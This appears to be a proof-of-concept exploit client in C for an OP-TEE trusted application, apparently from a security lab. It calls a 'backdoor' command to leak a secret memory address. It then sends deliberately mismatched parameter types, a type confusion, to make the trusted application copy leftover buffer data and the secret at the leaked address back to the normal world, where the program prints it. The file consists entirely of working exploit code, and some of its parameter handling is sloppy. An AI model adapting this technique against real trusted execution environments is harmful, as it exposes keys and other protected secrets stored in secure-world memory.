#include <err.h>
#include <stdio.h>
#include <string.h>

#include <tee_client_api.h>

#include <type_confusion.h>


static inline uint64_t reg_pair_to_64(uint32_t reg0, uint32_t reg1)
{
    return (uint64_t)reg0 << 32 | reg1;
}

static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
            uint32_t *reg1)
{
    *reg0 = val >> 32;
    *reg1 = val;
}

int main(int argc, char *argv[])
{
	TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_TYPE_CONFUSION_UUID;
    uint32_t backdoor;
    uint32_t err_origin;

    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    memset(&op, 0, sizeof(op));
        printf("================================================\n");

    // printf("%s %d\n", __FILE__, __LINE__);
    {
        op.params[0].value.a = 0;
        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_VALUE_INOUT,
                TEEC_NONE,
                TEEC_NONE,
                TEEC_NONE
            );
        printf("Invoking TA for %s, %s\n", "backdoor","leak secret address");
        res = TEEC_InvokeCommand(&sess, TA_BACKDOOR_CMD_INVOKE, &op, &err_origin);
        if(res != 0x0) goto fin;
        backdoor = op.params[0].value.a;
        printf("Secret address is at: %p\n", op.params[0].value.a);
    }
    printf("================================================\n");
    {
        char buffer_a[512];
        char buffer_b[32+15+1];
        strcpy(buffer_a, "a");
        memset(buffer_b, 0, sizeof(buffer_b));
        memset(buffer_b, 'b', sizeof(buffer_b)-1);


        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_MEMREF_TEMP_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_MEMREF_TEMP_INPUT,
                TEEC_VALUE_INPUT
            );
        
        // printf("%s %d\n", __FILE__, __LINE__);
        
        op.params[0].tmpref.buffer = buffer_a;
        op.params[0].tmpref.size = sizeof(buffer_a);
        reg_pair_from_64(strlen(buffer_a),&op.params[1].value.a,&op.params[1].value.b);
        op.params[2].tmpref.buffer = buffer_b;
        op.params[2].tmpref.size = strlen(buffer_b);
        reg_pair_from_64(1,&op.params[1].value.a,&op.params[3].value.b);
        
        printf("Invoking TA for %s\n", "remain data in op.params[2].tmpref.size");
        res = TEEC_InvokeCommand(&sess, TA_TYPE_CONFUSION_CMD_INVOKE, &op, &err_origin);
        
        printf("Length: %zu\n", reg_pair_to_64(op.params[1].value.a,op.params[1].value.b));
        printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
        printf("Size: %zu\n", op.params[0].tmpref.size);
        printf("Pointer: %p\n", op.params[0].tmpref.buffer);
        printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
    }
        printf("================================================\n");
    {
        char buffer_a[512];
        char buffer_b[] = "";
        strcpy(buffer_a, "");

        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_MEMREF_TEMP_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_VALUE_INPUT
            );
        
        
        op.params[0].tmpref.buffer = buffer_a;
        op.params[0].tmpref.size = sizeof(buffer_a);
        reg_pair_from_64(strlen(buffer_a),&op.params[1].value.a,&op.params[1].value.b);
        op.params[2].tmpref.buffer = backdoor;
        op.params[2].tmpref.size = 50;
        // printf("a:%d\n",op.params[2].value.a);
        // printf("b:%d\n",op.params[2].value.b);
        // printf("size:%d\n",op.params[2].tmpref.size);
        reg_pair_from_64(1,&op.params[1].value.a,&op.params[3].value.b);
        
        printf("Invoking TA for %s, %s\n", "output buffer","secret");
        res = TEEC_InvokeCommand(&sess, TA_TYPE_CONFUSION_CMD_INVOKE, &op, &err_origin);
        // if(res != TEE_SUCCESS) goto fin;
        
        printf("Secret Size: %zu\n", strlen(op.params[0].tmpref.buffer));
        printf("Secret Pointer: %p\n", op.params[0].tmpref.buffer);
        printf("Secret Contents: %s\n", (char*)op.params[0].tmpref.buffer);
    }
        printf("================================================\n");    
    fin:
        TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);

	return 0;
}
